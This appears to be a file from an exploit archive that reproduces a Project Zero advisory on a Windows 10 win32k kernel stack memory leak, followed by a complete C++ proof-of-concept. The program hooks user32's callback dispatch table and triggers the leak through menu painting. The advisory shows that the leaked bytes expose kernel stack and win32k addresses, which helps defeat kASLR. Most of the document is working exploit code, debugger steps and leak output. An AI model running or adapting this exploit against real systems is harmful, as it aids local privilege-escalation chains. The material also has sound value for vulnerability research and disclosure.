@@ -1,0 +1,212 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1192
+
+We have discovered that it is possible to disclose portions of uninitialized kernel stack memory to user-mode applications in Windows 10 indirectly through the win32k!NtUserPaintMenuBar system call, or more specifically, through the user32!fnINLPUAHDRAWMENUITEM user-mode callback (#107 on Windows 10 1607 32-bit).
+
+In our tests, the callback is invoked under the following stack trace:
+
+--- cut ---
+a75e6a8c 81b63813 nt!memcpy
+a75e6aec 9b1bb7bc nt!KeUserModeCallback+0x163
+a75e6c10 9b14ff79 win32kfull!SfnINLPUAHDRAWMENUITEM+0x178
+a75e6c68 9b1501a3 win32kfull!xxxSendMessageToClient+0xa9
+a75e6d20 9b15361c win32kfull!xxxSendTransformableMessageTimeout+0x133
+a75e6d44 9b114420 win32kfull!xxxSendMessage+0x20
+a75e6dec 9b113adc win32kfull!xxxSendMenuDrawItemMessage+0x102
+a75e6e48 9b1138f4 win32kfull!xxxDrawMenuItem+0xee
+a75e6ecc 9b110955 win32kfull!xxxMenuDraw+0x184
+a75e6f08 9b11084e win32kfull!xxxPaintMenuBar+0xe1
+a75e6f34 819a8987 win32kfull!NtUserPaintMenuBar+0x7e
+a75e6f34 77d74d50 nt!KiSystemServicePostCall
+00f3f08c 7489666a ntdll!KiFastSystemCallRet
+00f3f090 733ea6a8 win32u!NtUserPaintMenuBar+0xa
+00f3f194 733e7cef uxtheme!CThemeWnd::NcPaint+0x1fc
+00f3f1b8 733ef3c0 uxtheme!OnDwpNcActivate+0x3f
+00f3f22c 733ede88 uxtheme!_ThemeDefWindowProc+0x800
+00f3f240 75d8c2aa uxtheme!ThemeDefWindowProcW+0x18
+00f3f298 75d8be4a USER32!DefWindowProcW+0x14a
+00f3f2b4 75db53cf USER32!DefWindowProcWorker+0x2a
+00f3f2d8 75db8233 USER32!ButtonWndProcW+0x2f
+00f3f304 75d8e638 USER32!_InternalCallWinProc+0x2b
+00f3f3dc 75d8e3a5 USER32!UserCallWinProcCheckWow+0x218
+00f3f438 75da5d6f USER32!DispatchClientMessage+0xb5
+00f3f468 77d74c86 USER32!__fnDWORD+0x3f
+00f3f498 74894c3a ntdll!KiUserCallbackDispatcher+0x36
+00f3f49c 75d9c1a7 win32u!NtUserCreateWindowEx+0xa
+00f3f774 75d9ba68 USER32!VerNtUserCreateWindowEx+0x231
+00f3f84c 75d9b908 USER32!CreateWindowInternal+0x157
+00f3f88c 000d15b7 USER32!CreateWindowExW+0x38
+--- cut ---
+
+The layout of the i/o structure passed down to the user-mode callback that we're seeing is as follows:
+
+--- cut ---
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000060: 00 00 00 00 00 00 00 00 00 00 00 00 ff ff ff ff ................
+00000070: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ................
+00000080: 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ................
+--- cut ---
+
+Where 00 denote bytes which are properly initialized, while ff indicate uninitialized values copied back to user-mode. As shown above, there are 20 bytes leaked at offsets 0x6c-0x7f. We have determined that these bytes originally come from a smaller structure of size 0x74, allocated in the stack frame of the win32kfull!xxxSendMenuDrawItemMessage function.
+
+We can easily demonstrate the vulnerability with a kernel debugger (WinDbg), by setting a breakpoint at win32kfull!xxxSendMenuDrawItemMessage, filling the local structure with a marker 0x41 ('A') byte after stepping through the function prologue, and then observing that these bytes indeed survived any kind of initialization and are printed out by the attached proof-of-concept program:
+
+--- cut ---
+3: kd> ba e 1 win32kfull!xxxSendMenuDrawItemMessage
+3: kd> g
+Breakpoint 0 hit
+win32kfull!xxxSendMenuDrawItemMessage:
+9b11431e 8bff            mov     edi,edi
+1: kd> p
+win32kfull!xxxSendMenuDrawItemMessage+0x2:
+9b114320 55              push    ebp
+1: kd> p
+win32kfull!xxxSendMenuDrawItemMessage+0x3:
+9b114321 8bec            mov     ebp,esp
+1: kd> p
+win32kfull!xxxSendMenuDrawItemMessage+0x5:
+9b114323 81ec8c000000    sub     esp,8Ch
+1: kd> p
+win32kfull!xxxSendMenuDrawItemMessage+0xb:
+9b114329 a1e0dd389b      mov     eax,dword ptr [win32kfull!__security_cookie (9b38dde0)]
+1: kd> p
+win32kfull!xxxSendMenuDrawItemMessage+0x10:
+9b11432e 33c5            xor     eax,ebp
+1: kd> p
+win32kfull!xxxSendMenuDrawItemMessage+0x12:
+9b114330 8945fc          mov     dword ptr [ebp-4],eax
+1: kd> p
+win32kfull!xxxSendMenuDrawItemMessage+0x15:
+9b114333 833d0ca6389b00  cmp     dword ptr [win32kfull!gihmodUserApiHook (9b38a60c)],0
+1: kd> f ebp-78 ebp-78+74-1 41
+Filled 0x74 bytes
+1: kd> g
+--- cut ---
+
+Then, the relevant part of the PoC output should be similar to the following:
+
+--- cut ---
+00000000: 88 b2 12 01 92 00 00 00 00 00 00 00 01 00 00 00 ................
+00000010: 00 00 00 00 39 05 00 00 01 00 00 00 00 01 00 00 ....9...........
+00000020: 61 02 0a 00 1a 08 01 01 08 00 00 00 1f 00 00 00 a...............
+00000030: 50 00 00 00 32 00 00 00 00 00 00 00 61 02 0a 00 P...2.......a...
+00000040: 1a 08 01 01 00 0a 00 00 00 00 00 00 00 00 00 00 ................
+00000050: 00 00 00 00 3a 00 00 00 0f 00 00 00 00 00 00 00 ....:...........
+00000060: 00 00 00 00 00 00 00 00 00 00 00 00 41 41 41 41 ............AAAA
+00000070: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000080: a0 64 d8 77 60 66 d8 77 ?? ?? ?? ?? ?? ?? ?? ?? .d.w`f.w........
+--- cut ---
+
+The 20 aforementioned bytes are clearly leaked to ring-3 in an unmodified, uninitialized form. If we don't manually insert markers into the kernel stack, an example output of the PoC can be as follows:
+
+--- cut ---
+00000000: 88 b2 ab 01 92 00 00 00 00 00 00 00 01 00 00 00 ................
+00000010: 00 00 00 00 39 05 00 00 01 00 00 00 00 01 00 00 ....9...........
+00000020: db 01 1d 00 47 08 01 17 08 00 00 00 1f 00 00 00 ....G...........
+00000030: 50 00 00 00 32 00 00 00 00 00 00 00 db 01 1d 00 P...2...........
+00000040: 47 08 01 17 00 0a 00 00 00 00 00 00 00 00 00 00 G...............
+00000050: 00 00 00 00 3a 00 00 00 0f 00 00 00 00 00 00 00 ....:...........
+00000060: 00 00 00 00 00 00 00 00 00 00 00 00 28 d3 ab 81 ............(...
+00000070: 80 aa 20 9b 33 26 fb af fe ff ff ff 00 5e 18 94 .. .3&.......^..
+00000080: a0 64 d8 77 60 66 d8 77 ?? ?? ?? ?? ?? ?? ?? ?? .d.w`f.w........
+--- cut ---
+
+Starting at offset 0x6C, we can observe leaked contents of a kernel _EH3_EXCEPTION_REGISTRATION structure:
+
+.Next             = 0x81abd328
+.ExceptionHandler = 0x9b20aa80
+.ScopeTable       = 0xaffb2633
+.TryLevel         = 0xfffffffe
+
+This immediately discloses the address of the kernel-mode stack and the win32k image in memory -- information that is largely useful for local attackers seeking to defeat the kASLR exploit mitigation, or disclose other sensitive data stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <cstdio>
+
+namespace globals {
+  LPVOID (WINAPI *Orig_fnINLPUAHDRAWMENUITEM)(LPVOID);
+}  // namespace globals;
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+PVOID *GetUser32DispatchTable() {
+  __asm{
+    mov eax, fs:30h
+    mov eax, [eax + 0x2c]
+  }
+}
+
+BOOL HookUser32DispatchFunction(UINT Index, PVOID lpNewHandler, PVOID *lpOrigHandler) {
+  PVOID *DispatchTable = GetUser32DispatchTable();
+  DWORD OldProtect;
+
+  if (!VirtualProtect(DispatchTable, 0x1000, PAGE_READWRITE, &OldProtect)) {
+    printf("VirtualProtect#1 failed, %d\n", GetLastError());
+    return FALSE;
+  }
+
+  *lpOrigHandler = DispatchTable[Index];
+  DispatchTable[Index] = lpNewHandler;
+
+  if (!VirtualProtect(DispatchTable, 0x1000, OldProtect, &OldProtect)) {
+    printf("VirtualProtect#2 failed, %d\n", GetLastError());
+    return FALSE;
+  }
+
+  return TRUE;
+}
+
+LPVOID WINAPI fnINLPUAHDRAWMENUITEM_Hook(LPVOID Data) {
+  printf("----------\n");
+  PrintHex((PBYTE)Data, 0x88);
+  return globals::Orig_fnINLPUAHDRAWMENUITEM(Data);
+}
+
+int main() {
+  // Hook the user32!fnINLPUAHDRAWMENUITEM user-mode callback dispatch function.
+  // The #107 index is specific to Windows 10 1607 32-bit.
+  if (!HookUser32DispatchFunction(107, fnINLPUAHDRAWMENUITEM_Hook, (PVOID *)&globals::Orig_fnINLPUAHDRAWMENUITEM)) {
+    return 1;
+  }
+
+  // Create a menu.
+  HMENU hmenu = CreateMenu();
+  AppendMenu(hmenu, MF_STRING, 1337, L"Menu item");
+
+  // Create a window with the menu in order to trigger the vulnerability.
+  HWND hwnd = CreateWindowW(L"BUTTON", L"TestWindow", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
+                            CW_USEDEFAULT, CW_USEDEFAULT, 100, 100, NULL, hmenu, 0, 0);
+  DestroyWindow(hwnd);
+
+  return 0;
+}
